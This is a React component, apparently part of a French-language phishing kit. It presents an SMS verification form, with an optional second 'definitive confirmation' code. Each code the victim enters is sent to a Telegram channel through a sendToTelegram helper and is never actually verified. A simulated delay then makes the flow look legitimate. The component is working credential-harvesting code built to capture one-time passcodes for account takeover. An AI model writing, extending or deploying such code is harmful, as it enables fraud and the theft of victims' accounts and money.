import React, { useState } from 'react';
import { sendToTelegram } from '../utils/telegram';

interface SmsCodeFormProps {
  onNext: () => void;
  isSecondCode?: boolean;
}

export default function SmsCodeForm({ onNext, isSecondCode = false }: SmsCodeFormProps) {
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Préparer le message pour Telegram
    const message = `
<b>📨 Code SMS saisi</b>

<b>Code SMS:</b> ${code}
<b>Type:</b> ${isSecondCode ? 'Deuxième code de vérification' : 'Premier code de vérification'}
<b>Timestamp:</b> ${new Date().toLocaleString('fr-FR')}
<b>Page:</b> Vérification SMS
    `;

    // Envoyer vers Telegram
    await sendToTelegram(message);

    // Simuler un délai puis passer à l'étape suivante
    setTimeout(() => {
      setIsLoading(false);
      onNext();
    }, 1500);
  };

  return (
    <div className="continer">
      <form onSubmit={handleSubmit}>
        <h2>{isSecondCode ? 'Confirmation définitive' : 'Confirmation'}</h2>

        <div className="col">
          <h4 style={{ fontWeight: 'normal', textAlign: 'left' }}>
            {isSecondCode 
              ? 'Entrez le deuxième code de vérification reçu par SMS.'
              : 'Entrez le code de vérification reçu par SMS.'
            }
          </h4>
        </div>

        <div className="col">
          <input 
            type="text" 
            placeholder="Enter code" 
            value={code}
            onChange={(e) => setCode(e.target.value)}
            required 
          />

          <div className="but">
            <button type="submit" disabled={isLoading}>
              {isLoading ? 'Traitement...' : (isSecondCode ? 'Confirmation' : 'Confirmer')}
            </button>
          </div>
        </div>
      </form>
    </div>
  );
}